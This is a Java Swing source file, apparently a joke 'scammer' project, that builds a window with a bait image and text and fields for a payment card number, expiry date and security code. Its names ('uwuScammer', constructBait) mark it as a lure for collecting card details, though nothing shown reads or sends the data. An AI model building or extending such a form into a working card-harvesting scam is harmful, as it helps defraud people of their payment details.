package sauce.me.JBDCE.uwuScammer;

import javax.swing.*;
import java.awt.BorderLayout;
import java.awt.GridLayout;

public class InputWindow extends JFrame {
    private JPanel alluringImagePanel = new JPanel();
    private JLabel alluringImage = new JLabel();

    private JPanel inputOptionsPanel = new JPanel();
    private JLabel alluringText = new JLabel("<html>Loading subtile Messages...</html>");

    private JPanel creditCardNumberPanel = new JPanel();
    private JLabel creditCardNumberLabel = new JLabel("Card Number:");
    private JTextField creditCardNumberInput = new JTextField(10);

    private JPanel expriyDatePanel = new JPanel();
    private JLabel expiryDateLabel =  new JLabel("Expiry Date:");
    private JTextField expiryDateInput = new JTextField(10);

    private JPanel securityNumberPanel = new JPanel();
    private JLabel securityNumberLabel = new JLabel("Security Code:");
    private JTextField securityNumberInput = new JTextField(10);

    private JPanel confirmPanel = new JPanel();
    private JLabel confirmLabel = new JLabel("Confirm?");
    private JCheckBox confirmCheckBox = new JCheckBox();
    private JButton confirmButton = new JButton("Send Information UwU?");


    private void arrangeElements(){

        this.setLayout(new GridLayout(1,0));
        this.add(alluringImagePanel);
        this.add(new JSeparator(SwingConstants.VERTICAL));
        this.add(inputOptionsPanel);

        alluringImagePanel.add(alluringImage);

        inputOptionsPanel.setLayout(new BoxLayout(inputOptionsPanel, BoxLayout.Y_AXIS));
        inputOptionsPanel.add(alluringText);

        inputOptionsPanel.add(creditCardNumberPanel);
        creditCardNumberPanel.add(creditCardNumberLabel, BorderLayout.WEST);
        creditCardNumberPanel.add(creditCardNumberInput, BorderLayout.EAST);

        inputOptionsPanel.add(expriyDatePanel);
        expriyDatePanel.add(expiryDateLabel, BorderLayout.WEST);
        expriyDatePanel.add(expiryDateInput, BorderLayout.EAST);

        inputOptionsPanel.add(securityNumberPanel);
        securityNumberPanel.add(securityNumberLabel);
        securityNumberPanel.add(securityNumberInput);

        inputOptionsPanel.add(confirmPanel);
        confirmPanel.add(confirmLabel);
        confirmPanel.add(confirmCheckBox);
        confirmPanel.add(confirmButton);
    }

    private void constructBait(Icon alluringImage, String alluringText){
        this.alluringImage.setIcon(alluringImage);;
        this.alluringText.setText(alluringText);
    }

    public InputWindow(){
        this.setSize(800, 400);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setTitle("Sample Text");
        //this.setResizable(false);

        arrangeElements();

        this.setVisible(true);
    }

    public InputWindow(Icon alluringImage, String alluringText) {
        // Build that shit
        this.setSize(500, 200);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setTitle("Sample Text");

        constructBait(alluringImage, alluringText);
        arrangeElements();

        
        this.setVisible(true);
    }


}